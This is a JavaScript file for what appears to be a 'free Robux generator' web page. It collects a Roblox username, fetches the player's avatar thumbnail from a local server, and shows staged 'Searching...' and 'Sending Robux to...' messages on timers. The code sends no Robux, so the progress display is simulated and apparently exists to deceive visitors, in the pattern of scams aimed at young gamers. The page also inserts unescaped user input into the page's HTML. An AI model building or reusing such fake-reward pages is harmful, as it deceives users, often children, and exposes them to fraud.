document.addEventListener("DOMContentLoaded", function () {
    const rbxbtn = document.querySelector(".getrbx");
    const box1 = document.querySelector(".box");
    const box2 = document.querySelector(".box2");
    const box3 = document.querySelector(".box3");
    const box4 = document.querySelector(".box4");
    const rbxtotal = document.querySelectorAll(".details");
    const username = document.querySelector(".username");
    const useroutput = document.querySelector(".useroutput");
    const usernameDisplay = document.getElementById('usernameDisplay');
    let thumbnailUrl = ""; // Store thumbnail URL

    console.log("DOM fully loaded and parsed");

    // Function to handle Next button click/touch
    const handleNextButtonClick = (event) => {
        event.preventDefault(); // Prevent any default action
        console.log("Next button clicked or touched"); // Debugging line to check click events
        if (username.value.length <= 2) {
            alert("Please enter a valid username");
        } else {
            // Start searching
            useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
            fetchThumbnail(username.value).then(url => {
                thumbnailUrl = url;
                box1.style.display = "none";
                box2.style.display = "block";
                setTimeout(() => {
                    showbox2();
                    showbox3();
                    displayThumbnail();
                }, 2500);
            }).catch(error => {
                alert("Error fetching thumbnail. Please try again.");
                console.error(error);
            });
        }
    };

    // Attach event listeners for "Next" button
    rbxbtn.addEventListener("click", handleNextButtonClick);
    rbxbtn.addEventListener("touchend", handleNextButtonClick); // Added for mobile devices

    // Function to handle Robux amount button click/touch
    const handleRobuxButtonClick = (event) => {
        event.preventDefault(); // Prevent any default action
        console.log("Robux amount button clicked or touched");
        box3.style.display = "none";
        box2.style.display = "block";
        setTimeout(showboxagain, 2500);
        setTimeout(showbox4, 2500);
        useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
    };

    // Attach event listeners for each Robux amount detail button
    rbxtotal.forEach((btn) => {
        btn.addEventListener("click", handleRobuxButtonClick);
        btn.addEventListener("touchend", handleRobuxButtonClick); // Added for mobile devices
    });

    let showboxagain = () => {
        box2.style.display = "none";
    };
    let showbox2 = () => {
        box2.style.display = "none";
    };
    let showbox3 = () => {
        box3.style.display = "block";
    };
    let showbox4 = () => {
        box4.style.display = "block";
    };

    // Function to fetch thumbnail URL
    async function fetchThumbnail(username) {
        console.log("Fetching thumbnail for username:", username);
        const response = await fetch('http://127.0.0.1:5000/get_thumbnail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username: username })
        });
        const data = await response.json();
        if (data.thumbnailUrl) {
            console.log("Thumbnail URL fetched successfully:", data.thumbnailUrl);
            return data.thumbnailUrl;
        } else {
            throw new Error('Thumbnail not found');
        }
    }

    // Function to display thumbnail in box3
    function displayThumbnail() {
        if (thumbnailUrl) {
            console.log("Displaying thumbnail in box3");
            const thumbnailContainer = document.createElement("div");
            thumbnailContainer.className = "thumbnail-container"; // Added class for styling
            thumbnailContainer.innerHTML = `<img src="${thumbnailUrl}" alt="Roblox Thumbnail">`;
            box3.appendChild(thumbnailContainer);
        }
    }
});
